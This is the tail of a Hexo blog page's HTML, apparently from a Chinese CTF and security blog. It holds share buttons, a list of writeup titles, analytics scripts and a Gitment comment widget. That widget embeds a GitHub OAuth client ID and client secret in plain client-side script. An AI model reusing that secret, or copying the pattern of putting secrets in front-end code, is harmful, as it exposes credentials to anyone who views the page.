	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
</div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='https://static.5am3.com/js/baidu/share.js?v=111.js?cdnversion='+~(-new Date()/36e5)];</script>




    
        <div id="gitments" style="width: 90%; margin: 0 auto;"></div>
<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>

<script>
    var gitment = new Gitment({
      id: window.location.pathname,
      owner: '5am3',
      repo: '5am3.github.io',
      oauth: {
        client_id: 'f9b6a0a70c093d4f4f91',
        client_secret: 'ddda0abc39ed79ab681585813d74b83e5e00256a',
      },
    })
    gitment.render('gitments')
</script> 
    



    <div class="scroll" id="post-nav-button">
        
            <a  href="/2018/05/04/web-testing-one/" title="上一篇: 记一次简单的渗透测试">
                <i class="fa fa-angle-left"></i>
            </a>
        
        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a  href="/2018/03/26/qwb-xss-rpo/" title="下一篇: 强网杯-Share your mind">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/02/11/ctf-node1/">近两次比赛遇到的node题目简析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/19/ddctf2019/">2019DDCTF  writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/12/2018HCTF-share/">2018HCTF-share</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/23/MysqlOnline-writeup/">MysqlOnline writeup 巅峰极客</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/04/GourdScan_V2/">GourdScan V2 配置安全及使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/0ctf-final/">2018 0CTF final h4x0rs.date</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/04/web-testing-one/">记一次简单的渗透测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/24/ddctf2018/">2018DDCTF  writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/26/qwb-xss-rpo/">强网杯-Share your mind</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/25/anheng-2-xss/">2018安恒杯二月赛-web-应该不是 XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/08/SCodeCTF/">通过docker部署ctf题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/20/2017LCTF-1/">2017LCTF wanna hack him? writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/09/360-interview/">360面试经历及心得</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/31/miac2-writeup/">2017-miac2-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/02/xman-2/">【诺熙】XMAN训练营手记-2-密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/01/xman-1/">XMAN训练营手记-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/17/hexo2/">2.初识HEXO-页面配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/17/hexo1/">1.初识HEXO-文档排版</a></li></ul>
    
    <script src="https://cdn.bootcdn.net/ajax/libs/require.js/2.1.6/require.min.js"></script>
    <script src="https://cdn.bootcdn.net/ajax/libs/jquery/1.9.1/jquery.min.js"></script>

    <script>
        $(".post-list").addClass("toc-article");
        // $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#toc, .switch-btn, .switch-area").toggle();
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
                $(".switch-btn, .switch-area").fadeToggle(300);
            }
        })
    </script>




    <script>
        
    </script>

</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2024 丶诺熙
            </div>
            <div class="footer-right">
                <p>Power By <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/maochunguang/black-blue" target="_blank">Themme by tommy</a></p>
            </div>
        </div>
        
            <div class="visit">
                <script src="https://s22.cnzz.com/z_stat.php?id=1267947142&web_id=1267947142" language="JavaScript"></script>
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >极客到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>


    </div>
    
<script src="/js/main.js"></script>


    <script>
        $(document).ready(function() {
            var backgroundnum = 4;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>


<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'xxxxx', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->



	<script>
	var _hmt = _hmt || [];
	(function() {
	  var hm = document.createElement("script");
	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
	  var s = document.getElementsByTagName("script")[0]; 
	  s.parentNode.insertBefore(hm, s);
	})();
	</script>



<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>


<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(
            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>